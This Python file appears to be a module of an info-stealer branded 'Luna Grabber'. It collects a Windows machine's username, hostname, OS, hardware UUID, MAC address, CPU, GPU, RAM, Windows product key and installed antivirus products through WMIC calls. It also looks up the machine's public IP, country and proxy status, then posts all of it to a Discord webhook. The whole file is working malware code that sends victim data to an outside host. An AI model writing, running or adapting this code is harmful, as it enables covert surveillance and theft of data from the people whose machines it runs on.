import os
import psutil
import pycountry
import requests
import subprocess

# Function to get country code based on country name
def get_country_code(country_name):
    try:
        country = pycountry.countries.lookup(country_name)
        return str(country.alpha_2).lower()
    except LookupError:
        return "white"

# Function to get all antivirus software installed on the system
def get_all_avs() -> str:
    process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
    if process.returncode == 0:
        output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
        if len(output) >= 2:
            output = output[1:]
            output = [av.strip() for av in output]
            return ", ".join(output)

# Function to collect system info and send it to a Discord webhook
def get_system_info(webhook):
    # Get system details
    computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
    cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    ram = str(round(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().split()[1]) / (1024 ** 3)))
    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")
    uuid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    product_key = subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() if subprocess.run("wmic path softwarelicensingservice get OA3xOriginalProductKey", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip() != "" else "Failed to get product key"

    # Try to get the country, proxy, and IP address using the external API
    try:
        r = requests.get("http://ip-api.com/json/?fields=225545").json()
        if r["status"] != "success":
            raise Exception("Failed")
        country = r["country"]
        proxy = r["proxy"]
        ip = r["query"]
    except Exception:
        country = "Failed to get country"
        proxy = "Failed to get proxy"
        ip = "Failed to get IP"

    # Get the MAC address of the system
    _, addrs = next(iter(psutil.net_if_addrs().items()))
    mac = addrs[0].address

    # Construct the data to be sent to Discord
    data = {
        "embeds": [
            {
                "title": "Luna Logger",
                "color": 5639644,
                "fields": [
                    {
                        "name": "System Info",
                        "value": f''':computer: **PC Username:** `{username}`\n
:desktop: **PC Name:** `{hostname}`\n
:globe_with_meridians: **OS:** `{computer_os}`\n
<:windows:1239719032849174568> **Product Key:** `{product_key}`\n
:eyes: **IP:** `{ip}`\n
:flag_{get_country_code(country)}: **Country:** `{country}`\n
{":shield:" if proxy else ":x:"} **Proxy:** `{proxy}`\n
:green_apple: **MAC:** `{mac}`\n
:wrench: **UUID:** `{uuid}`\n
<:cpu:1051512676947349525> **CPU:** `{cpu}`\n
<:gpu:1051512654591688815> **GPU:** `{gpu}`\n
<:ram1:1051518404181368972> **RAM:** `{ram}GB`\n
:cop: **Antivirus:** `{get_all_avs()}`'''
                    }
                ],
                "footer": {
                    "text": "Luna Grabber | Created By Smug"
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
                }
            }
        ],
        "username": "Luna",
        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
    }

    # Send the data to the provided webhook
    response = requests.post(webhook, json=data)
    if response.status_code == 204:
        print("bich tsob chwya 7jettt")
    else:
        print(f"Failed to send system info. Status: {response.status_code}, {response.text}")

